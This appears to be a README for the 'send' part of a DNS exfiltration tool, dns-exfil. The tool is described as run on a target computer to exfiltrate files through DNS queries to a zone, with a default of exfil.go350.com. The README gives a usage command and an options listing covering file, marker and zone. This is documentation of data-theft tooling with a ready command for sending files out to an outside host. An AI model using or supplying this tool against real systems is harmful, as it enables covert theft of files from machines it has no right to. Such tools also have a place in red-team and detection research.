# dns-exfil - send

Run send on the target computer to exfiltrate files.

## How to use

```bash
$ send -d -file ../test-files/gpl-3.0.txt -marker wsxdec
```

## Options

```bash
$ send
  -d	enable debugging.
  -file string
    	the local file to exfiltrate.
  -help
    	show help.
  -marker string
    	a unique marker to identify the file in the dns logs. (default "jzp")
  -zone string
    	the dns zone to send the queries to. (default "exfil.go350.com")

```
